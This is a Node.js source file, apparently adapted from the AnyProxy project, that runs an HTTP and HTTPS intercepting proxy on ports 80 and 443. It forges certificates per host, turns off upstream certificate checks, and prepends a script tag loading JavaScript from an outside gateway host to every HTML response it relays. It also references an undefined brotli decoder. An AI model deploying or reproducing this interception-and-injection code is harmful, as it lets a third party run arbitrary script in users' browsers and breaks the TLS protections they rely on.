const http = require('http'),
  https = require('https'),
  async = require('async'),
  tls = require('tls'),
  crypto = require('crypto'),
  co = require('co'),
  color = require('colorful'),
  url = require('url'),
  certMgr = require('./lib/certMgr'),
  util = require('./lib/util'),
  zlib = require('zlib'),
  logUtil = require('./lib/log'),
  Readable = require('stream').Readable;
const DEFAULT_CHUNK_COLLECT_THRESHOLD = 20 * 1024 * 1024; // about 20 mb
class CommonReadableStream extends Readable {
  constructor(config) {
    super({
      highWaterMark: DEFAULT_CHUNK_COLLECT_THRESHOLD * 5
    });
  }
  _read(size) {

  }
}
/**
 * fetch remote response
 *
 * @param {string} protocol
 * @param {object} options options of http.request
 * @param {buffer} reqData request body
 * @param {object} config
 * @param {boolean} config.dangerouslyIgnoreUnauthorized
 * @param {boolean} config.chunkSizeThreshold
 * @returns
 */
function fetchRemoteResponse(protocol, options, reqData, config) {
  reqData = reqData || '';
  return new Promise((resolve, reject) => {
    delete options.headers['content-length']; // will reset the content-length after rule
    delete options.headers['Content-Length'];
    delete options.headers['Transfer-Encoding'];
    delete options.headers['transfer-encoding'];

    if (config.dangerouslyIgnoreUnauthorized) {
      options.rejectUnauthorized = false;
    }

    if (!config.chunkSizeThreshold) {
      throw new Error('chunkSizeThreshold is required');
    }

    //send request
    const proxyReq = (/https/i.test(protocol) ? https : http).request(options, (res) => {
      res.headers = util.getHeaderFromRawHeaders(res.rawHeaders);
      //deal response header
      const statusCode = res.statusCode;
      const resHeader = res.headers;
      let resDataChunks = []; // array of data chunks or stream
      const rawResChunks = []; // the original response chunks
      let resDataStream = null;
      let resSize = 0;
      const finishCollecting = () => {
        new Promise((fulfill, rejectParsing) => {
          if (resDataStream) {
            fulfill(resDataStream);
          } else {
            const serverResData = Buffer.concat(resDataChunks);
            const originContentLen = util.getByteSize(serverResData);
            // remove gzip related header, and ungzip the content
            // note there are other compression types like deflate
            const contentEncoding = resHeader['content-encoding'] || resHeader['Content-Encoding'];
            const ifServerGzipped = /gzip/i.test(contentEncoding);
            const isServerDeflated = /deflate/i.test(contentEncoding);
            const isBrotlied = /br/i.test(contentEncoding);

            /**
             * when the content is unzipped, update the header content
             */
            const refactContentEncoding = () => {
              if (contentEncoding) {
                resHeader['x-anyproxy-origin-content-encoding'] = contentEncoding;
                delete resHeader['content-encoding'];
                delete resHeader['Content-Encoding'];
              }
            }

            // set origin content length into header
            resHeader['x-anyproxy-origin-content-length'] = originContentLen;

            // only do unzip when there is res data
            if (ifServerGzipped && originContentLen) {
              refactContentEncoding();
              zlib.gunzip(serverResData, (err, buff) => {
                if (err) {
                  rejectParsing(err);
                } else {
                  fulfill(buff);
                }
              });
            } else if (isServerDeflated && originContentLen) {
              refactContentEncoding();
              zlib.inflateRaw(serverResData, (err, buff) => {
                if (err) {
                  rejectParsing(err);
                } else {
                  fulfill(buff);
                }
              });
            } else if (isBrotlied && originContentLen) {
              refactContentEncoding();

              try {
                // an Unit8Array returned by decompression
                const result = brotliTorb.decompress(serverResData);
                fulfill(Buffer.from(result));
              } catch (e) {
                rejectParsing(e);
              }
            } else {
              fulfill(serverResData);
            }
          }
        }).then((serverResData) => {
          resolve({
            statusCode,
            header: resHeader,
            body: serverResData,
            rawBody: rawResChunks,
            _res: res,
          });
        }).catch((e) => {
          reject(e);
        });
      };

      //deal response data
      res.on('data', (chunk) => {
        rawResChunks.push(chunk);
        if (resDataStream) { // stream mode
          resDataStream.push(chunk);
        } else { // dataChunks
          resSize += chunk.length;
          resDataChunks.push(chunk);

          // stop collecting, convert to stream mode
          if (resSize >= config.chunkSizeThreshold) {
            resDataStream = new CommonReadableStream();
            while (resDataChunks.length) {
              resDataStream.push(resDataChunks.shift());
            }
            resDataChunks = null;
            finishCollecting();
          }
        }
      });

      res.on('end', () => {
        if (resDataStream) {
          resDataStream.push(null); // indicate the stream is end
        } else {
          finishCollecting();
        }
      });
      res.on('error', (error) => {
        logUtil.printLog('error happend in response:' + error, logUtil.T_ERR);
        reject(error);
      });
    });

    proxyReq.on('error', reject);
    proxyReq.end(reqData);
  });
}
const server = {
  proxyPort: 80,
  proxyHttpsPort: 443,
  proxyHostname: "www.bajdcc.com",
  close: function () {
    if (server.httpProxyServer)
      server.httpProxyServer.close((error) => {
      if (error) {
        console.error(error);
        logUtil.printLog(`proxy server close FAILED : ${error.message}`, logUtil.T_ERR);
      } else {
        this.httpProxyServer = null;
        logUtil.printLog(`proxy server closed at ${this.proxyHostname}:${this.proxyPort}`);
      }
    });
    if (server.httpsProxyServer)
      server.httpsProxyServer.close((error) => {
        if (error) {
          console.error(error);
          logUtil.printLog(`proxy server close FAILED : ${error.message}`, logUtil.T_ERR);
        } else {
          this.httpProxyServer = null;
          logUtil.printLog(`proxy server closed at ${this.proxyHostname}:${this.proxyPort}`);
        }
      });
  },
  userRequestHandler: function (req, userRes) {
    /*
    note
      req.url is wired
      in http  server: http://www.example.com/a/b/c
      in https server: /a/b/c
    */

    const host = req.headers.host;
    const protocol = (!!req.connection.encrypted && !(/^http:/).test(req.url)) ? 'https' : 'http';
    const fullUrl = protocol === 'http' ? req.url : (protocol + '://' + host + req.url);

    const urlPattern = url.parse(fullUrl);
    const path = urlPattern.path;
    const chunkSizeThreshold = DEFAULT_CHUNK_COLLECT_THRESHOLD;

    let resourceInfo = {};
    let resourceInfoId = -1;
    let reqData;
    let requestDetail;

    // refer to https://github.com/alibaba/anyproxy/issues/103
    // construct the original headers as the reqheaders
    req.headers = util.getHeaderFromRawHeaders(req.rawHeaders);

    logUtil.printLog(color.green(`received request to: ${req.method} ${protocol}://${host}${path}`));

    /**
     * fetch complete req data
     */
    const fetchReqData = () => new Promise((resolve) => {
      const postData = [];
      req.on('data', (chunk) => {
        postData.push(chunk);
      });
      req.on('end', () => {
        reqData = Buffer.concat(postData);
        resolve();
      });
    });

    /**
     * prepare detailed request info
     */
    const prepareRequestDetail = () => {
      const options = {
        hostname: urlPattern.hostname || req.headers.host|| req.headers.Host,
        port: urlPattern.port || req.port || (/https/.test(protocol) ? 443 : 80),
        path,
        method: req.method,
        headers: req.headers
      };

      requestDetail = {
        requestOptions: options,
        protocol,
        url: fullUrl,
        requestData: reqData,
        _req: req
      };

      return Promise.resolve();
    };

    /**
     * send response to client
     *
     * @param {object} finalResponseData
     * @param {number} finalResponseData.statusCode
     * @param {object} finalResponseData.header
     * @param {buffer|string} finalResponseData.body
     */
    const sendFinalResponse = (finalResponseData) => {
      const responseInfo = finalResponseData.response;
      const resHeader = responseInfo.header;
      const responseBody = responseInfo.body || '';

      const transferEncoding = resHeader['transfer-encoding'] || resHeader['Transfer-Encoding'] || '';
      const contentLength = resHeader['content-length'] || resHeader['Content-Length'];
      const connection = resHeader.Connection || resHeader.connection;
      if (contentLength) {
        delete resHeader['content-length'];
        delete resHeader['Content-Length'];
      }

      // set proxy-connection
      if (connection) {
        resHeader['x-anyproxy-origin-connection'] = connection;
        delete resHeader.connection;
        delete resHeader.Connection;
      }

      if (!responseInfo) {
        throw new Error('failed to get response info');
      } else if (!responseInfo.statusCode) {
        throw new Error('failed to get response status code')
      } else if (!responseInfo.header) {
        throw new Error('filed to get response header');
      }
      // if there is no transfer-encoding, set the content-length
      if (transferEncoding !== 'chunked'
        && !(responseBody instanceof CommonReadableStream)
      ) {
        resHeader['Content-Length'] = util.getByteSize(responseBody);
      }

      userRes.writeHead(responseInfo.statusCode, resHeader);

      if (responseBody instanceof CommonReadableStream) {
        responseBody.pipe(userRes);
      } else {
        userRes.end(responseBody);
      }

      return responseInfo;
    };

    // fetch complete request data
    co(fetchReqData)
      .then(prepareRequestDetail)
      // invoke rule before sending request
      .then(co.wrap(function *() {
        const userModifiedInfo = {};
        const finalReqDetail = {};
        ['protocol', 'requestOptions', 'requestData', 'response'].map((key) => {
          finalReqDetail[key] = userModifiedInfo[key] || requestDetail[key]
        });
        return finalReqDetail;
      }))
      // route user config
      .then(co.wrap(function *(userConfig) {
        if (userConfig.response) {
          // user-assigned local response
          userConfig._directlyPassToRespond = true;
          return userConfig;
        } else if (userConfig.requestOptions) {
          const remoteResponse = yield fetchRemoteResponse(userConfig.protocol, userConfig.requestOptions, userConfig.requestData, {
            dangerouslyIgnoreUnauthorized: true,
            chunkSizeThreshold,
          });
          return {
            response: {
              statusCode: remoteResponse.statusCode,
              header: remoteResponse.header,
              body: remoteResponse.body,
              rawBody: remoteResponse.rawBody
            },
            _res: remoteResponse._res
          };
        } else {
          throw new Error('lost response or requestOptions, failed to continue');
        }
      }))
      // invoke rule before responding to client
      .then(co.wrap(function *(responseData) {
        if (responseData._directlyPassToRespond) {
          return responseData;
        } else if (responseData.response.body && responseData.response.body instanceof CommonReadableStream) { // in stream mode
          return responseData;
        } else {
          // TODO: err etimeout
          return responseData;
        }
      }))
      .then(co.wrap(function *(responseData) {
        const ct = responseData.response.header["Content-Type"] || responseData.response.header["content-type"];
        if (ct && ct.match(/text\/html/)) {
          responseData.response.body = "<script src='//gateway.baidu.com/baidu/inject/all.js?v=190407'></script>" + responseData.response.body;
        }
        return responseData;
      }))
      .then(sendFinalResponse)

      //update record info
      /*.then((responseInfo) => {
        resourceInfo.endTime = new Date().getTime();
        resourceInfo.res = { //construct a self-defined res object
          statusCode: responseInfo.statusCode,
          headers: responseInfo.header,
        };

        resourceInfo.statusCode = responseInfo.statusCode;
        resourceInfo.resHeader = responseInfo.header;
        resourceInfo.resBody = responseInfo.body instanceof CommonReadableStream ? '(big stream)' : (responseInfo.body || '');
        resourceInfo.length = resourceInfo.resBody.length;

       // console.info('===> resbody in record', resourceInfo);
      })*/
      .catch((e) => {
        logUtil.printLog(color.green('Send final response failed:' + e.message), logUtil.T_ERR);
      });
  }
};
async.series(
  [
    //creat proxy server
    function (callback) {
      server.httpProxyServer = http.createServer(server.userRequestHandler);
      callback(null);
    },

    //start proxy server
    function (callback) {
      server.httpProxyServer.listen(server.proxyPort);
      callback(null);
    },
  ],

  //final callback
  (err, result) => {
    if (!err) {
      const tipText = 'proxy started on port ' + server.proxyPort;
      logUtil.printLog(color.green(tipText));
    } else {
      const tipText = 'err when start proxy server :(';
      logUtil.printLog(color.red(tipText), logUtil.T_ERR);
      logUtil.printLog(err, logUtil.T_ERR);
    }
  }
);

const createSecureContext = tls.createSecureContext || crypto.createSecureContext;
function SNIPrepareCert(serverName, SNICallback) {
  let keyContent,
    crtContent,
    ctx;
  async.series([
    (callback) => {
      certMgr.getCertificate(serverName, (err, key, crt) => {
        if (err) {
          callback(err);
        } else {
          keyContent = key;
          crtContent = crt;
          callback();
        }
      });
    },
    (callback) => {
      try {
        ctx = createSecureContext({
          key: keyContent,
          cert: crtContent
        });
        callback();
      } catch (e) {
        callback(e);
      }
    }
  ], (err) => {
    if (!err) {
      const tipText = 'proxy server for __NAME established'.replace('__NAME', serverName);
      logUtil.printLog(color.yellow(color.bold('[internal https]')) + color.yellow(tipText));
      SNICallback(null, ctx);
    } else {
      logUtil.printLog('err occurred when prepare certs for SNI - ' + err, logUtil.T_ERR);
      logUtil.printLog('err occurred when prepare certs for SNI - ' + err.stack, logUtil.T_ERR);
    }
  });
}
async.series(
  [
    //creat proxy server
    function (callback) {
      certMgr.getCertificate(server.proxyHostname, (err, keyContent, crtContent) => {
        if (err) {
          callback(err);
        } else {
          server.httpsProxyServer = https.createServer({
            key: keyContent,
            cert: crtContent,
            SNICallback: SNIPrepareCert,
          }, server.userRequestHandler);
          callback(null);
        }
      });
    },

    //start proxy server
    function (callback) {
      server.httpsProxyServer.listen(server.proxyHttpsPort);
      callback(null);
    },
  ],

  //final callback
  (err, result) => {
    if (!err) {
      const tipText = 'proxy started on port ' + server.proxyHttpsPort;
      logUtil.printLog(color.green(tipText));
    } else {
      const tipText = 'err when start proxy server :(';
      logUtil.printLog(color.red(tipText), logUtil.T_ERR);
      logUtil.printLog(err, logUtil.T_ERR);
    }
  }
);

process.on('exit', (code) => {
  if (code > 0) {
    logUtil.printLog('AnyProxy is about to exit with code: ' + code, logUtil.T_ERR);
  }

  process.exit();
});

//exit cause ctrl+c
process.on('SIGINT', () => {
  try {
    server && server.close();
  } catch (e) {
    console.error(e);
  }
  process.exit();
});

process.on('uncaughtException', (err) => {
  let errorTipText = 'got an uncaught exception, is there anything goes wrong in your rule file ?\n';
  try {
    if (err && err.stack) {
      errorTipText += err.stack;
    } else {
      errorTipText += err;
    }
  } catch (e) { }
  logUtil.printLog(errorTipText, logUtil.T_ERR);
  try {
    server && server.close();
  } catch (e) { }
  process.exit();
});